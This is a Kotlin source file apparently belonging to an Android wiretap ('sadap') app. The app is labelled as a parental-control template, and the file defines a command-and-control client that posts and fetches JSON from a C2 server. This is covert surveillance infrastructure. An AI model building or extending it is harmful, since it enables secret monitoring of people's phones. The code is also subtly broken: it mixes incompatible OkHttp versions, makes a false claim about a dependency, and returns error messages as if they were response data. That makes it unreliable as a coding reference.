package com.sadap.template.network

import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

object C2Client {
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val JSON_MEDIA_TYPE = MediaType.parse("application/json; charset=utf-8")

    fun post(path: String, jsonPayload: JSONObject): String? {
        val body = RequestBody.create(JSON_MEDIA_TYPE, jsonPayload.toString())
        val request = Request.Builder()
            .url("${C2Config.C2_SERVER_BASE_URL}$path")
            .post(body)
            .build()
        return try {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) throw IOException("Unexpected code $response")
                response.body()?.string()
            }
        } catch (e: IOException) {
            e.message
        }
    }

    fun get(path: String, queryParams: Map<String, String>? = null): String? {
        val urlBuilder = "${C2Config.C2_SERVER_BASE_URL}$path".toHttpUrlOrNull()?.newBuilder()
        queryParams?.forEach { (key, value) ->
            urlBuilder?.addQueryParameter(key, value)
        }
        val url = urlBuilder?.build() ?: return null

        val request = Request.Builder()
            .url(url)
            .get()
            .build()
        return try {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) throw IOException("Unexpected code $response")
                response.body()?.string()
            }
        } catch (e: IOException) {
            e.message
        }
    }
}

// Tambahkan dependency ini di build.gradle (Module: parental-control-template):
// implementation 'com.squareup.okhttp3:okhttp:3.12.1'
// implementation 'com.squareup.okhttp3:okhttp-urlconnection:3.12.1' // Untuk toHttpUrlOrNull
